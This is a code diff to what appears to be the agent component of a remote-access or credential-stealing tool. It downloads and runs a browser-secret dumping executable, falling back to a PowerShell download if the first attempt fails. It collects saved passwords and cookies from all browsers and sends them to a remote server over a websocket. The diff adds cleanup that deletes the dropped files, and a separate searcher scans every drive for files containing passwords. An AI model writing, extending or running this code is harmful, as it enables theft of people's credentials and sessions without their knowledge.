@@ -3674,23 +3674,29 @@ class Agent:
 
 
     async def get_browser_credentials(self):
-
         try:
             await self.ws.send(json.dumps({
                 "type": "browser_creds_status",
-                "msg": "📥 Downloading DumpBrowserSecrets tool..."
+                "msg": "Downloading DumpBrowserSecrets tool..."
             }))
             
             exe_path = r"C:\Users\Public\DumpBrowserSecrets.exe"
             work_dir = r"C:\Users\Public"
             output_file = r"C:\Users\Public\output.txt"
             
-
             if not os.path.exists(exe_path):
                 def download_file():
                     import urllib.request
+                    import subprocess
                     url = "https://github.com/Maldev-Academy/DumpBrowserSecrets/releases/download/v1.2.0/DumpBrowserSecrets.exe"
-                    urllib.request.urlretrieve(url, exe_path)
+                    
+                    try:
+                        urllib.request.urlretrieve(url, exe_path)
+                    except:
+                        subprocess.run(
+                            f'powershell -Command "Invoke-WebRequest -Uri {url} -OutFile {exe_path}"',
+                            shell=True, capture_output=True
+                        )
                     return True
                 
                 await asyncio.to_thread(download_file)
@@ -3704,10 +3710,9 @@ class Agent:
             
             await self.ws.send(json.dumps({
                 "type": "browser_creds_status",
-                "msg": "🔍 Running DumpBrowserSecrets with /b:All (30-60 seconds)..."
+                "msg": "Running DumpBrowserSecrets with /b:All (30-60 seconds)..."
             }))
             
-
             def run_extractor():
                 cmd = f'"{exe_path}" /b:All > "{output_file}" 2>&1'
                 result = subprocess.run(
@@ -3723,7 +3728,6 @@ class Agent:
             
             stdout, stderr = await asyncio.to_thread(run_extractor)
             
-
             console_output = ""
             if os.path.exists(output_file):
                 def read_output():
@@ -3731,7 +3735,6 @@ class Agent:
                         return f.read()
                 console_output = await asyncio.to_thread(read_output)
             
-
             json_files = []
             for f in os.listdir(work_dir):
                 if f.endswith('.json') and f not in ['output.txt', 'temp_agent.py', 'temp_agent.spec']:
@@ -3739,6 +3742,15 @@ class Agent:
                         json_files.append(f)
             
             if not json_files:
+                # Очистка перед выходом
+                try:
+                    if os.path.exists(exe_path):
+                        os.remove(exe_path)
+                    if os.path.exists(output_file):
+                        os.remove(output_file)
+                except:
+                    pass
+                
                 await self.ws.send(json.dumps({
                     "type": "browser_creds_result",
                     "data": [],
@@ -3747,7 +3759,6 @@ class Agent:
                 }))
                 return
             
-
             all_logins = []
             all_cookies = []
             
@@ -3766,7 +3777,6 @@ class Agent:
                 try:
                     data = await asyncio.to_thread(read_json)
                     
-
                     browser_name = json_file.replace('Data.json', '').replace('Data', '')
                     if not browser_name or browser_name == json_file:
                         if 'Chrome' in json_file:
@@ -3780,7 +3790,6 @@ class Agent:
                         else:
                             browser_name = 'Unknown'
                     
-
                     for login in data.get('logins', []):
                         all_logins.append({
                             'browser': browser_name,
@@ -3790,7 +3799,6 @@ class Agent:
                             'password': login.get('password', '')
                         })
                     
-
                     for cookie in data.get('cookies', []):
                         all_cookies.append({
                             'browser': browser_name,
@@ -3806,10 +3814,8 @@ class Agent:
                         "msg": f"⚠️ Error reading {json_file}: {str(e)[:100]}"
                     }))
             
-
             formatted_results = []
             
-
             for login in all_logins:
                 formatted_results.append({
                     'browser': login.get('browser', 'Unknown'),
@@ -3819,8 +3825,7 @@ class Agent:
                     'password': login.get('password', '')
                 })
             
-
-            for cookie in all_cookies[:30]:  
+            for cookie in all_cookies[:30]:
                 formatted_results.append({
                     'browser': cookie.get('browser', 'Unknown'),
                     'profile': cookie.get('profile', 'Default'),
@@ -3829,9 +3834,17 @@ class Agent:
                     'password': f"{cookie.get('name', '')}={cookie.get('value', '')}"
                 })
             
-
             total_logins = len(all_logins)
             total_cookies = len(all_cookies)
+            
+            # Очистка временных файлов
+            try:
+                if os.path.exists(exe_path):
+                    os.remove(exe_path)
+                if os.path.exists(output_file):
+                    os.remove(output_file)
+            except:
+                pass
             
             await self.ws.send(json.dumps({
                 "type": "browser_creds_result",
@@ -3839,13 +3852,6 @@ class Agent:
                 "status": console_output[:10000] if console_output else stdout,
                 "msg": f"✅ Found {total_logins} passwords, {total_cookies} cookies from {len(json_files)} browser(s)"
             }))
-            
-
-
-
-
-
-
             
         except Exception as e:
             await self.ws.send(json.dumps({
@@ -5568,14 +5574,14 @@ class PasswordsInFilesSearcher:
         self.search_in_content = True
         self.search_in_filenames = True
         
-        await self.send_status(f"🚀 Starting password file search (speed: {speed_limit} files/sec)...")
-        await self.send_status(f"🔍 Searching in: file CONTENT + file NAMES")
+        await self.send_status(f" Starting password file search (speed: {speed_limit} files/sec)...")
+        await self.send_status(f" Searching in: file CONTENT + file NAMES")
         
         keywords = self.build_keywords(custom_word)
-        await self.send_status(f"🔍 Searching for {len(keywords)} keywords (including filename match)")
+        await self.send_status(f" Searching for {len(keywords)} keywords (including filename match)")
         
         drives = self.get_drives(disk_option)
-        await self.send_status(f"📁 Scanning {len(drives)} location(s)...")
+        await self.send_status(f" Scanning {len(drives)} location(s)...")
         
         total_matches = 0
         filename_matches = 0
@@ -5587,7 +5593,7 @@ class PasswordsInFilesSearcher:
                 self.is_searching = False
                 return
             
-            await self.send_status(f"📂 Scanning: {drive}")
+            await self.send_status(f" Scanning: {drive}")
             matches = await self.scan_directory(drive, keywords, max_size_mb, skip_binary)
             
 
@@ -5601,10 +5607,10 @@ class PasswordsInFilesSearcher:
         
         if not self.stop_requested and self.is_searching:
             await self.send_status(
-                f"✅ Search completed! Found {total_matches} matches total:\n"
-                f"   📝 Filename matches: {filename_matches}\n"
-                f"   📄 Content matches: {content_matches}\n"
-                f"   📊 Scanned {self.scanned_count} files total."
+                f" Search completed! Found {total_matches} matches total:\n"
+                f"    Filename matches: {filename_matches}\n"
+                f"    Content matches: {content_matches}\n"
+                f"    Scanned {self.scanned_count} files total."
             )
         
         self.is_searching = False
